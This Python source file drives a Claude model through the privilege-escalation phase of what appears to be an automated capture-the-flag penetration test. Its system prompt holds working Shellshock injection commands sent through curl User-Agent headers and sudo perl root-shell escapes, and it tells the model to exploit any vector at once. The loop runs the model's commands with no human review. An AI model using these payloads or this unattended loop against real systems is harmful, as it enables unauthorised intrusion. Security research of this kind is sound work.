"""
Privilege Escalation Phase Agent — Escalate from user to root.
"""

import re
import json
import logging
from anthropic import Anthropic
from src.state import AgentState, PhaseResult, Phase
from src.tools.executor import ToolExecutor
from src.memory.findings import FindingsStore, Finding
from src.agents.parse_utils import parse_agent_response

logger = logging.getLogger(__name__)

PRIVESC_SYSTEM_PROMPT = """You are an expert penetration tester performing PRIVILEGE ESCALATION on a Linux target.

You have gained initial access as a low-privilege user. Your goal is to escalate to root.

YOUR FINDINGS SO FAR:
{findings_context}

ENUMERATION CHECKLIST (work through these systematically):
1. sudo -l (check what you can run as root)
2. Find SUID binaries: find / -perm -4000 -type f 2>/dev/null
3. Check cron jobs: cat /etc/crontab; ls -la /etc/cron*
4. Check writable files/dirs in sensitive locations
5. Check kernel version for known exploits: uname -a
6. Check for credentials in config files, history, etc.
7. Check for interesting capabilities: getcap -r / 2>/dev/null

IMPORTANT: If you find a sudo entry like "(root) NOPASSWD: /usr/bin/perl", you should
immediately try to exploit it using GTFOBins techniques. For example:
  sudo perl -e 'exec "/bin/bash";'

RULES:
1. You MUST respond with valid JSON only — no markdown, no explanation outside JSON.
2. Be systematic — check the enumeration checklist in order.
3. When you find a privesc vector, EXPLOIT IT immediately.
4. After escalating, immediately run: whoami and cat /root/root.txt
5. You have a maximum of {max_commands} commands.
6. Set "phase_complete" to true once you have root access and/or the root flag.

NOTE: Since we are executing commands via a Shellshock command injection vector,
format your commands to work in that context. Wrap commands like:
  curl -H "User-Agent: () {{ :;}}; echo; /bin/bash -c 'COMMAND'" http://TARGET/cgi-bin/user.sh

IMPORTANT: When using single quotes inside the bash -c command, use double quotes for the
outer curl -H argument or escape carefully. Example for sudo perl privesc:
  curl -H "User-Agent: () {{ :;}}; echo; /bin/bash -c 'sudo /usr/bin/perl -e exec(\"/bin/sh\")'" http://TARGET/cgi-bin/user.sh

Or to just read the root flag directly:
  curl -H "User-Agent: () {{ :;}}; echo; /bin/bash -c 'sudo /usr/bin/perl -e system(\"cat /root/root.txt\")'" http://TARGET/cgi-bin/user.sh

RESPONSE FORMAT (strictly JSON):
{{
    "reasoning": "Why I'm choosing this action",
    "command": "the exact command to run",
    "phase_complete": false,
    "findings": [
        {{
            "category": "privesc_vector|credential|flag",
            "value": "description",
            "confidence": "high|medium|low"
        }}
    ]
}}"""

PRIVESC_USER_TEMPLATE = """TARGET: {target_ip}
ATTACKER IP: {attacker_ip}

CURRENT STATE:
{state_context}

ACCUMULATED FINDINGS:
{findings_context}

Commands remaining this phase: {commands_remaining}

What is your next privilege escalation action?"""


class PrivescAgent:
    """Drives the privilege escalation phase using Claude."""

    def __init__(
        self,
        client: Anthropic,
        executor: ToolExecutor,
        findings: FindingsStore,
        model: str = "claude-sonnet-4-20250514",
        max_commands: int = 12,
        attacker_ip: str = "10.10.14.1",
    ):
        self.client = client
        self.executor = executor
        self.findings = findings
        self.model = model
        self.max_commands = max_commands
        self.attacker_ip = attacker_ip

    def run(self, state: AgentState) -> PhaseResult:
        logger.info(f"{'='*60}")
        logger.info(f"PRIVESC PHASE — Target: {state.target_ip}")
        logger.info(f"{'='*60}")

        commands_run = []
        reasoning_trace = []
        commands_used = 0

        while commands_used < self.max_commands:
            user_prompt = PRIVESC_USER_TEMPLATE.format(
                target_ip=state.target_ip,
                attacker_ip=self.attacker_ip,
                state_context=state.get_context_summary(),
                findings_context=self.findings.get_context_for_prompt(),
                commands_remaining=self.max_commands - commands_used,
            )

            response = self.client.messages.create(
                model=self.model,
                max_tokens=2048,
                system=PRIVESC_SYSTEM_PROMPT.format(
                    findings_context=self.findings.get_context_for_prompt(),
                    max_commands=self.max_commands,
                ),
                messages=[{"role": "user", "content": user_prompt}],
            )

            response_text = response.content[0].text.strip()

            try:
                decision = parse_agent_response(response_text)
            except json.JSONDecodeError:
                logger.error(f"Failed to parse response: {response_text[:200]}")
                reasoning_trace.append(f"[PARSE ERROR] {response_text[:200]}")
                commands_used += 1
                continue

            reasoning = decision.get("reasoning", "")
            command = decision.get("command", "")
            phase_complete = decision.get("phase_complete", False)
            new_findings = decision.get("findings", [])

            reasoning_trace.append(reasoning)
            logger.info(f"[PRIVESC] Reasoning: {reasoning}")
            logger.info(f"[PRIVESC] Command: {command}")

            for f in new_findings:
                self.findings.add_finding(Finding(
                    category=f["category"],
                    value=f["value"],
                    source_command=command or "analysis",
                    confidence=f.get("confidence", "medium"),
                    phase="privesc",
                ))
                # Check for flag findings
                if f["category"] == "flag":
                    if "root" in f["value"].lower():
                        # Extract the hash from the value
                        flag_match = re.search(r"\b[a-f0-9]{32}\b", f["value"])
                        if flag_match:
                            state.flags["root"] = flag_match.group(0)
                        else:
                            state.flags["root"] = f["value"]
                    elif "user" in f["value"].lower():
                        flag_match = re.search(r"\b[a-f0-9]{32}\b", f["value"])
                        if flag_match:
                            state.flags["user"] = flag_match.group(0)
                        else:
                            state.flags["user"] = f["value"]

                # Also check any finding value for flag hashes
                flag_match = re.search(r"\b[a-f0-9]{32}\b", f["value"])
                if flag_match:
                    flag_val = flag_match.group(0)
                    if not state.flags["user"]:
                        state.flags["user"] = flag_val
                        logger.info(f"[FLAG] User flag found in findings: {flag_val}")
                    elif not state.flags["root"] and flag_val != state.flags["user"]:
                        state.flags["root"] = flag_val
                        logger.info(f"[FLAG] Root flag found in findings: {flag_val}")

            if phase_complete:
                logger.info("[PRIVESC] Phase marked complete — root achieved!")
                break

            if not command:
                commands_used += 1
                continue

            record = self.executor.execute(command, reasoning=reasoning)
            state.add_command(record)
            commands_run.append(record)
            commands_used += 1

            # Check for flags in output
            self._check_for_flags(record.output, state)

            logger.info(f"[PRIVESC] Output preview: {record.output[:300]}")

        return PhaseResult(
            phase=Phase.PRIVESC,
            success=state.flags.get("root") is not None,
            findings=[f.value for f in self.findings.get_by_category("privesc_vector")]
                     + [f.value for f in self.findings.get_by_category("flag")],
            commands_run=commands_run,
            reasoning_trace=reasoning_trace,
        )

    def _check_for_flags(self, output: str, state: AgentState) -> None:
        """Check for HTB flag patterns in command output."""
        flags = re.findall(r"\b[a-f0-9]{32}\b", output)
        for flag in flags:
            if not state.flags["user"]:
                state.flags["user"] = flag
                logger.info(f"[FLAG] User flag captured: {flag}")
            elif not state.flags["root"] and flag != state.flags["user"]:
                state.flags["root"] = flag
                logger.info(f"[FLAG] Root flag captured: {flag}")
